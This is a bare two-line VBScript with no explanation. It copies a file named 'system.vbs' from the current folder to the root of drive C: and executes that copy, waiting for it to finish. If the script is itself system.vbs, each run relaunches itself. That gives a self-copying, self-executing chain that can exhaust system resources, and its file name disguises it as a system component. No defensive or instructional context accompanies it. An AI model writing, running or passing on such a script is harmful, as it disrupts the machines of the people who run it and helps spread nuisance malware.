CreateObject("Scripting.FileSystemObject").CopyFile CreateObject("WScript.Shell").CurrentDirectory&"\system.vbs", "C:\"
CreateObject("WScript.Shell").Run "C:\system.vbs", 1, true